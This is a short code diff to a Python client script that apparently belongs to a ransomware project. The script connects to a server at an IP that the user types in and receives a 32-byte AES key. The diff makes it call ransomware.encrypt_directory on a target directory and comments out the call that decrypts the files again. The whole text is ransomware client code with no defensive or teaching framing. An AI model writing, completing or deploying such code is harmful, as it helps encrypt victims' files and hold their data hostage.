@@ -2,6 +2,8 @@ import socket
 import ssl
 import ransomware
 import time
+dir = ""
+#key = ""
 def get_ip():
     return input("Enter the server ip: ")
 
@@ -17,13 +19,12 @@ def server_connection():
         except ConnectionError:
             ip = get_ip()
     key = client.recv(32)# aes key is 32 bytes
-    ransomware.process_directory("",key)
+    ransomware.encrypt_directory(dir,key)
     return None 
 
 if __name__ == "__main__":
     server_connection()
-    time.sleep(20)
-    ransomware.decrypt_directory("")
+    #ransomware.decrypt_directory(dir,key)
 
     
     
